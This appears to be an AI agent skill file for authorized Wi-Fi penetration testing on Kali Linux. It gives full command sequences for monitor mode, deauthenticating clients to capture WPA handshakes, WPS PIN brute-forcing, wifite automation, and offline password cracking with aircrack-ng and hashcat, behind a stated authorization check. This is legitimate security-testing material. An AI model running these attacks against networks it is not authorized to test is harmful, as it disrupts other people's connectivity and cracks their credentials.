---
name: kali-wireless
description: "Kali menu 06 — Wireless Attacks. Compound workflow for authorized Wi-Fi security testing: puts an adapter in monitor mode (airmon-ng), surveys and captures (airodump-ng), forces handshakes (aireplay-ng) or automates with wifite, tests WPS (reaver/bully), and cracks captures (aircrack-ng/hashcat). Use when the user wants to audit, capture handshakes from, or crack a Wi-Fi network they own or are authorized to test."
---

# Wireless Attacks (Kali 06)

Goal: audit a Wi-Fi network you own/are authorized to test — capture a WPA(2) handshake or
test WPS, then crack offline.

## Authorization gate
Wi-Fi testing is legally sensitive: capturing/deauthing a network you do not own is illegal in
most places. Only run against the user's OWN AP or a network with written authorization.
Confirm the exact target BSSID/ESSID before deauth or WPS attacks — do not hit neighbors.

## Hardware note (Raspberry Pi 4)
The Pi's built-in `wlan0` has poor/no monitor-mode + injection support. Use an external USB
adapter with a known good chipset (Atheros AR9271, Ralink RT3070, MediaTek MT7612U, Realtek
RTL8812AU). Check: `iw dev` then `sudo iw list | grep -A8 "Supported interface modes"` — you
need "monitor" and ideally injection (`sudo aireplay-ng --test wlan0mon`).

## Phase 1 — Monitor mode
```
sudo airmon-ng check kill                 # stop NetworkManager/wpa_supplicant interference
sudo airmon-ng start wlan0                # creates wlan0mon
iwconfig                                   # confirm Mode:Monitor
```

## Phase 2 — Survey
```
sudo airodump-ng wlan0mon                  # list APs: BSSID, CH, ENC, ESSID, clients
```
Note the target BSSID and channel, and any associated client MAC.

## Phase 3 — Capture the WPA handshake
```
sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon      # lock to target, write cap
# in a second terminal, nudge one client to reconnect:
sudo aireplay-ng --deauth 3 -a <BSSID> -c <CLIENT> wlan0mon
```
Watch for "WPA handshake: <BSSID>" in the airodump header. 3 deauths is usually enough — don't flood.

## Phase 4 — WPS path (alternative)
```
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv            # WPS PIN brute (slow)
sudo bully wlan0mon -b <BSSID> -c <CH>                    # alternative WPS tool
```

## Phase 5 — Automate (optional)
```
sudo wifite --kill                        # scans, captures handshakes, tries WPS/PMKID, cracks
```

## Phase 6 — Crack offline
```
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt   # quick CPU crack
# or convert for hashcat (faster, resumable):
hcxpcapngtool -o wifi.hc22000 capture-01.cap
hashcat -m 22000 wifi.hc22000 /usr/share/wordlists/rockyou.txt
```

## Cleanup
```
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

## Output and handoff
Record ESSID/BSSID, encryption, whether a handshake/PMKID was captured, and crack result.
Send the `.hc22000` to **kali-password-attacks** if you want rule-based cracking.

## Gotchas
- Always lock airodump to one channel (`-c`) or you miss the handshake.
- `airmon-ng check kill` drops your network — do Wi-Fi work from the console, not SSH over Wi-Fi.
- PMKID attack (clientless) is captured by wifite/hcxdumptool and also cracks as mode 22000.
